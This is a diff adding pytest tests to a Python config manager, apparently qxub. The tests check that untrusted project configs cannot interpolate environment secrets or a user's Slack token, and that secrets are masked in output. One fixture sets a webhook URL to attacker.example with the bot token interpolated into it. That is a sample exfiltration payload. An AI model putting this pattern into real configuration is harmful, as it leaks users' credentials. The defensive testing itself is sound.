@@ -4,6 +4,7 @@ import os
 from pathlib import Path
 
 import pytest
+from omegaconf import OmegaConf
 
 from qxub.config.files import xdg_config_dirs
 from qxub.config.manager import ConfigManager
@@ -320,3 +321,96 @@ def test_exec_does_not_ssh_for_a_cloned_projects_platform(sandbox, tmp_path):
     sandbox.write_config(project)
     sandbox.run("exec", "--dry-run", "--", "true", env=env)
     assert "attacker-host" in marker.read_text()
+
+
+# -- interpolation and secrets in project config ---------------------------------
+
+LEAKY_PROJECT = """\
+defaults:
+  queue: express
+  out: /tmp/leak/${oc.env:QXUB_TEST_SECRET}/out.log
+  name: ${notifications.slack.bot_token}
+  email: [a, "${oc.env:QXUB_TEST_SECRET}"]
+notifications:
+  slack:
+    webhook_url: https://attacker.example/${notifications.slack.bot_token}
+"""
+
+USER_SECRETS = """\
+notifications:
+  slack:
+    bot_token: xoxb-user-secret
+    webhook_url: https://hooks.slack.com/services/user-secret
+"""
+
+
+def test_project_interpolations_are_not_resolved(home, monkeypatch, capsys):
+    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
+    _write_user_config(home, USER_SECRETS)
+    path = _write_project(home / "work", LEAKY_PROJECT)
+
+    cm = ConfigManager()
+    defaults = cm.get_defaults()
+    assert defaults == {"queue": "express"}
+    assert cm.get_config_value("notifications.slack.webhook_url") == (
+        "https://hooks.slack.com/services/user-secret"
+    )
+    dumped = str(OmegaConf.to_container(cm.merged_config, resolve=True))
+    assert "env-secret" not in dumped
+    assert "attacker.example" not in dumped
+    err = capsys.readouterr().err
+    assert str(path) in err
+    assert "defaults.out" in err and "defaults.name" in err
+
+
+def test_a_trusted_project_may_interpolate(home, monkeypatch):
+    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
+    _write_user_config(home, f"security:\n  trusted_projects: [{home / 'work'}]\n")
+    _write_project(
+        home / "work", "defaults:\n  out: /tmp/${oc.env:QXUB_TEST_SECRET}.log\n"
+    )
+    assert ConfigManager().get_defaults()["out"] == "/tmp/env-secret.log"
+
+
+def test_user_config_interpolation_still_works(home, monkeypatch):
+    monkeypatch.setenv("QXUB_TEST_SECRET", "env-secret")
+    _write_user_config(
+        home, "notifications:\n  slack:\n    bot_token: ${oc.env:QXUB_TEST_SECRET}\n"
+    )
+    cm = ConfigManager()
+    assert cm.get_config_value("notifications.slack.bot_token") == "env-secret"
+
+
+def test_project_notifications_are_ignored_even_when_trusted(home):
+    _write_user_config(
+        home,
+        USER_SECRETS + f"security:\n  trusted_projects: [{home / 'work'}]\n",
+    )
+    _write_project(
+        home / "work",
+        "notifications:\n  slack:\n    webhook_url: https://attacker.example/x\n",
+    )
+    cm = ConfigManager()
+    assert cm.get_config_value("notifications.slack.webhook_url") == (
+        "https://hooks.slack.com/services/user-secret"
+    )
+
+
+def test_config_get_and_list_mask_secrets(sandbox):
+    sandbox.write_config(USER_SECRETS + "defaults:\n  queue: normal\n")
+    for args in (
+        ["config", "get"],
+        ["config", "get", "notifications"],
+        ["config", "get", "notifications.slack.bot_token"],
+        ["config", "list"],
+        ["config", "list", "notifications"],
+        ["config", "list", "--user-only"],
+        ["config", "list", "--show-origin"],
+    ):
+        result = sandbox.run(*args)
+        assert result.returncode == 0, (args, result.stderr)
+        assert "user-secret" not in result.stdout, args
+        assert "********" in result.stdout, args
+
+    shown = sandbox.run("config", "get", "--show-secrets", "notifications")
+    assert "xoxb-user-secret" in shown.stdout
